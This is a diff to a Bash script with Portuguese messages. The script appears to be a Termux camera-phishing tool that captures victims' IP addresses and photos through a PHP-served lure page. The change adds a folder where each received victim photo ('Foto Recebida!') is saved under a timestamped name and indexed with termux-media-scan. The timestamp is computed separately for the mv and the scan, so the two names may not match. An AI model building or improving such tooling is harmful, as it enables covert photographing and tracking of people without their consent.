@@ -39,6 +39,11 @@ exit 1
 dependencies() {
 command -v php > /dev/null 2>&1 || { echo >&2 "Necessita de ter o PHP instalado."; exit 1; }
 }
+create_photo_folder() {
+    if [ ! -d "fotos" ]; then
+        mkdir fotos
+    fi
+}
 
 catch_ip() {
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
@@ -62,6 +67,8 @@ sleep 0.5
 
 if [[ -e "Log.log" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Foto Recebida!\e[0m\n"
+mv Log.log fotos/$(date +"%Y%m%d%H%M%S").jpg
+termux-media-scan fotos/$(date +"%Y%m%d%H%M%S").jpg
 rm -rf Log.log
 fi
 sleep 0.5
@@ -209,4 +216,5 @@ checkfound
 
 banner
 dependencies
+create_photo_folder
 start1
